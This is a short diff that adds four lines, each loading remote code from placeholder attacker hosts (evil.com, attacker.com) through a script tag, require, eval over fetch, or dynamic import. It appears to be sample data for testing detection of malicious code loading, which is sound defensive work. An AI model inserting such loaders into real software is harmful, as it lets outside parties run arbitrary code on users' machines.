@@ -1,0 +1,4 @@
+<script src="http://evil.com/payload.js"></script>
+require('http://attacker.com/malicious-module')
+eval(fetch('http://evil.com/code').then(r=>r.text()))
+import('//evil.com/module.js')
